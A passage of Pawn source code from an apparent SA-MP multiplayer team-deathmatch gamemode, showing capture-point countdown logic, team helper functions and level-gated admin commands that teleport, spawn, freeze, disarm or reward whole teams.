			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][GAS]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[RES]) && UnderAttack[RES] == 1 && IsPlayerCapturing[playerid][RES] == 1)
		{
			CountVar[playerid][RES]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][RES]);
			TextDrawSetString(CountText[playerid], str1);
		}
		/*if(IsPlayerInDynamicCP(playerid, CP[NPP]) && UnderAttack[NPP] == 1 && IsPlayerCapturing[playerid][NPP] == 1)
		{
			CountVar[playerid][NPP]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][NPP]);
			TextDrawSetString(CountText[playerid], str1);
		}*/
		if(IsPlayerInDynamicCP(playerid, CP[MOTEL]) && UnderAttack[MOTEL] == 1 && IsPlayerCapturing[playerid][MOTEL] == 1)
		{
			CountVar[playerid][MOTEL]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][MOTEL]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BATTLESHIP]) && UnderAttack[BATTLESHIP] == 1 && IsPlayerCapturing[playerid][BATTLESHIP] == 1)
		{
			CountVar[playerid][BATTLESHIP]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][BATTLESHIP]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[HOSPITAL]) && UnderAttack[HOSPITAL] == 1 && IsPlayerCapturing[playerid][HOSPITAL] == 1)
		{
			CountVar[playerid][HOSPITAL]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][HOSPITAL]);
			TextDrawSetString(CountText[playerid], str1);
		}
	}
	return 1;
}
stock GetTeamName(playerid)
{
	new str[66];
	if(gTeam[playerid] == TEAM_PAKISTAN) str =  ("Pakistan");
	else if(gTeam[playerid] == TEAM_INDIA) str =  ("India");
	else if(gTeam[playerid] == TEAM_CHINA) str =  ("China");
	else if(gTeam[playerid] == TEAM_USA) str =  ("USA");
	else if(gTeam[playerid] == TEAM_NEPAL) str =  ("Nepal");
	else if(gTeam[playerid] == TEAM_NEPAL) str =  ("Dubai");
	else if(gTeam[playerid] == TEAM_ML) str =  ("Malaysia");
	return str;
}
//==============SendTeamMessage function by jarnu==============================
stock SendTeamMessage(teamid, color, string[])
{
  for(new x=0; x < MAX_PLAYERS; x++)
  {
	if(IsPlayerConnected(x))
	{
	  if(gTeam[x] == teamid)
	  {
		SendClientMessage(x, color, string);
	  }
	}
  }
  return 1;
}
//=======================Give Team Score by jarnu==============================
stock GiveTeamScore(teamid, amount)
{
  for(new x=0; x < MAX_PLAYERS; x++)
  {
	if(IsPlayerConnected(x))
	{
	  if(gTeam[x] == teamid)
	  {
		SetPlayerScore(x, GetPlayerScore(x)+amount);
	  }
	}
  }
  return 1;
}
//==============================================================================

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	return 1;
}
stock GetTeamCount(teamid)
{
   new playercount = 0;//Set our count to 0 as we have not counted any players yet..
    for(new i = 0; i < MAX_PLAYERS; i++)//Loop through MAX_PLAYERS(I suggest you redefine MAX_PLAYERS to ensure max efficency)..
    {
        if(GetPlayerState(i) == PLAYER_STATE_NONE) continue;//If a player is in class selection continue..
        if(gTeam[i] != teamid) continue;//If a player is NOT in the specified teamid continue..
        playercount++;//else (there in the teamid) so count the player in the team..
    }
    return playercount;//Return the total players counted in the specified team..
}
////////////////////////////////////////////////////////////////////////
CMD:ping(playerid, params[])
{
   new str[100], count = GetTickCount();
   format(str, sizeof(str),"Took %d to execute this command!", GetTickCount() - count);
   return SendClientMessage(playerid, red,str);
}
CMD:teams(playerid, params[])
{
   new team1count = GetTeamCount(TEAM_PAKISTAN);
   new team2count = GetTeamCount(TEAM_USA);
   new team3count = GetTeamCount(TEAM_INDIA);
   new team4count = GetTeamCount(TEAM_CHINA);
   new team5count = GetTeamCount(TEAM_NEPAL);
   new team6count = GetTeamCount(TEAM_DUBAI);
   new team7count = GetTeamCount(TEAM_ML);
   new str[500];
   SendClientMessage(playerid, orange,"|_____| Teams |_____| ");
   format(str, sizeof(str),"Pakistan: %d Players", team1count);
   SendClientMessage(playerid, TEAM_PAKISTAN_COLOR, str);
   format(str, sizeof(str),"India: %d Players", team3count);
   SendClientMessage(playerid, TEAM_INDIA_COLOR, str);
   format(str, sizeof(str),"USA: %d Players", team2count);
   SendClientMessage(playerid, TEAM_USA_COLOR, str);
   format(str, sizeof(str),"China: %d Players", team4count);
   SendClientMessage(playerid, TEAM_CHINA_COLOR, str);
   format(str, sizeof(str),"Nepal: %d Players", team5count);
   SendClientMessage(playerid, TEAM_NEPAL_COLOR, str);
   format(str, sizeof(str),"Dubai: %d Players", team6count);
   SendClientMessage(playerid, TEAM_DUBAI_COLOR, str);
   format(str, sizeof(str),"Malaysia: %d Players", team7count);
   SendClientMessage(playerid, TEAM_ML_COLOR, str);
   return 1;
}
CMD:getteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], Float:x, Float:y, Float:z, interior = GetPlayerInterior(playerid), world = GetPlayerVirtualWorld(playerid);
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"USAGE: /getteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia]");
	   GetPlayerPos(playerid, x, y, z);
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   SetPlayerPos(i, x+3, y, z);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------Dubai---------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   SetPlayerPos(i, x+3, y, z);
				   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   SetPlayerPos(i, x+3, y, z);
                   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   SetPlayerPos(i, x+3, y, z);
                   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:spawnteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"USAGE: /spawnteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
      //--------Dubai----------------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   SpawnPlayer(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has spawned team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:freezeteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"USAGE: /freezeteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //--------Dubai----------------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   TogglePlayerControllable(i, false);
				   PlayerInfo[i][Frozen] = 1;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has frozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:unfreezeteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"USAGE: /unfreezeteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //--------Dubai----------------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has unfrozen team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:disarmteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100];
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"USAGE: /unfreezeteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
					ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //--------Dubai----------------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
       //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   ResetPlayerWeapons(i);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has disarmed team %s",PlayerName2(playerid),params);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:gsteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], amount;
	   if(sscanf(params,"s[100]d",team, amount)) return SendClientMessage(playerid, RED,"USAGE: /gsteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia] [amount]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount, team);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //--------Dubai----------------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
        //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   SetPlayerScore(i, GetPlayerScore(i)+amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d score(s) to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:givecashteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], amount;
	   if(sscanf(params,"s[100]d",team, amount)) return SendClientMessage(playerid, RED,"USAGE: /givecashteam [teamname USA/Pakistan/Dubai/India/CHINA/Nepal/Malaysia] [amount]");
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_USA)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //---------------------------------
	   //--------Pakistan----------------
	   if(strfind(params,"Pakistan",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_PAKISTAN)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //--------Dubai----------------
	   if(strfind(params,"Dubai",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_DUBAI)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
